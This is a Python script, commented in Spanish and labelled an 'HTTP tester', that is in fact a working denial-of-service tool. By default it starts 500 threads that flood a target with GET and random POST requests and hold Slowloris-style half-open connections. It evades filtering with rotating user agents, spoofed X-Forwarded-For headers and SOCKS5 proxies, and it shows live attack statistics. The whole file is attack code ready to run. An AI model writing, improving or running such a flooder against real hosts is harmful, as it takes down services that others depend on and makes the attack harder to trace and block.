#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import socks
import ssl
import threading
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from argparse import ArgumentParser

# Configuración global
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/87.0.144 Chrome/81.0.4044.144 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-N950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; MI CC 9 MIUI/V11.0.1.0.QFCCNXM)",
    "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/33.00 YaApp_iOS_Browser/33.00 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 5.1; iris 810 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; A508DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/123.4.330040034 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.5; Win64; x64) AppleWebKit/536.26 (KHTML, like Gecko) Chrome/49.0.1659.324 Safari/602",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.1; WOW64; en-US Trident/6.0)",
    "Mozilla/5.0 (Linux; U; Android 5.1.1; MOTO XT1575 Build/LPH223) AppleWebKit/537.38 (KHTML, like Gecko) Chrome/47.0.2776.198 Mobile Safari/533.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_4; en-US) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/48.0.2074.319 Safari/536",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.1; x64 Trident/6.0)",
    "Mozilla/5.0 (Windows; Windows NT 6.3; x64; en-US) AppleWebKit/533.12 (KHTML, like Gecko) Chrome/47.0.1912.319 Safari/601.0 Edge/12.46260",
    "Mozilla/5.0 (iPad; CPU iPad OS 7_4_9 like Mac OS X) AppleWebKit/602.39 (KHTML, like Gecko) Chrome/48.0.2911.119 Mobile Safari/537.7",
    "Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/52.0.3206.281 Safari/601.1 Edge/14.27726",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_2; like Mac OS X) AppleWebKit/603.44 (KHTML, like Gecko)  Chrome/47.0.3216.371 Mobile Safari/534.3",
    "Mozilla/5.0 (Windows; U; Windows NT 10.0; x64) Gecko/20130401 Firefox/49.2"
    # Agregar mas AGENTES si es necesario
]

#Colores
RED = '\033[1;31m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
MAGENTA = '\033[1;35m'
WHITE = '\033[1;37m'
CYAN = '\033[1;36m'
END = '\033[0m'

class HTTP_Tester:
    def __init__(self):
        self.counter = {'success': 0, 'errors': 0, 'total': 0, 'bandwidth': 0}
        self.lock = threading.Lock()
        self.running = True
        self.proxies = self.cargarProxys()
        self.ssl_context = self.crearSSL()
        self.slow_sockets = []  # Para conexiones persistentes
        self.attack_modes = ['http_flood', 'slowloris', 'post_attack']  # Modos de ataque

    def cargarProxys(self):
        try:
            with open('proxys.txt') as f:
                proxies = [line.strip() for line in f if line.strip()]
                return self.verify_proxies(proxies) 
        except:
            return None

    def verify_proxies(self, proxies):
        return proxies  

    def crearSSL(self):
        context = ssl.create_default_context()
        context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')
        return context

    def get_http_request(self, host):
        attack_type = random.choice(self.attack_modes) # Genera múltiples tipos de peticiones
        
        if attack_type == 'slowloris':
            return (
                f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n" # Utiliza agentes de usuarios random
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                f"Connection: keep-alive\r\n"
                f"X-a: {random.randint(1,5000)}\r\n"
            )
        elif attack_type == 'post_attack':
            payload = f"data={os.urandom(16).hex()}"
            return (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n" 
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{payload}"
            )
        else:  # http_flood por defecto
            return (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n\r\n"
            )

    def http_flood(self, host, port):
        while self.running:
            try:
                if self.proxies and random.random() > 0.6:  
                    proxy = random.choice(self.proxies).split(':')
                    s = socks.socksocket()
                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                s.settimeout(12 if random.random() > 0.8 else 8) 

                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=host)
                
                s.connect((host, port))
                request = self.get_http_request(host).encode()
                s.send(request)
                
                # Técnica de Slowloris
                if "Connection: keep-alive" in request.decode() and random.random() > 0.7:
                    with self.lock:
                        self.slow_sockets.append(s)
                    time.sleep(random.uniform(15, 45)) 
                else:
                    if random.random() > 0.5:  
                        s.send(self.get_http_request(host).encode())
                    s.close()
                
                self.actualizarContador(True, len(request))
            except Exception as e:
                self.actualizarContador(False, 0)
            finally:
                time.sleep(random.uniform(0.001, 0.1))  # Delay más agresivo

    def actualizarContador(self, success, bytes_sent):
        with self.lock:
            self.counter['total'] += 1
            self.counter['bandwidth'] += bytes_sent
            if success:
                self.counter['success'] += 1
            else:
                self.counter['errors'] += 1

    def Estadisticas(self):
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"\n⚡ HTTP TESTER v1.0")
            print(f"[+] {WHITE}Objetivo:{END} {args.host}:{args.port}")
            print(f"[+] {YELLOW}Solicitudes:{END} {self.counter['total']} ({self.counter['total']/max(1,elapsed):.1f}/s)")
            print(f"[+] {BLUE}Ancho de Banda:{END} {self.counter['bandwidth']/(1024*1024):.2f} MB")
            print(f"[+] {GREEN}Éxito:{END} {self.counter['success']} | [+] {RED}Errores:{END} {self.counter['errors']}")
            print(f"[+] {CYAN}Hilos:{END} {threading.active_count() - 1}")
            print(f"[+] {MAGENTA}Conexiones Slow:{END} {len(self.slow_sockets)}")
            time.sleep(0.5)

def main():
    global args
    parser = ArgumentParser(description="HTTP TESTER v1.0")
    parser.add_argument("host", help="Host objetivo (ejemplo.com)")
    parser.add_argument("-p", "--port", type=int, default=443, help="Puerto objetivo")
    parser.add_argument("-t", "--threads", type=int, default=500, help="Número de hilos")
    parser.add_argument("-s", "--slowloris", action="store_true", help="Modo Slowloris intensivo")
    args = parser.parse_args()

    tester = HTTP_Tester()
    
    try:
        # Iniciar hilos 
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            threading.Thread(target=tester.Estadisticas, daemon=True).start()
            
            for _ in range(args.threads):
                executor.submit(tester.http_flood, args.host, args.port)
            
            while True: 
                time.sleep(1)
                with tester.lock:
                    tester.slow_sockets = [s for s in tester.slow_sockets if random.random() > 0.3]
                
    except KeyboardInterrupt:
        tester.running = False
        print(f"\nAtaque detenido | Estadísticas finales:")
        print(f"• Total requests: {tester.counter['total']}")
        print(f"• Ancho de banda consumido: {tester.counter['bandwidth']/(1024*1024):.2f} MB")
        print(f"• Conexiones lentas activas: {len(tester.slow_sockets)}")

if __name__ == "__main__":
    main()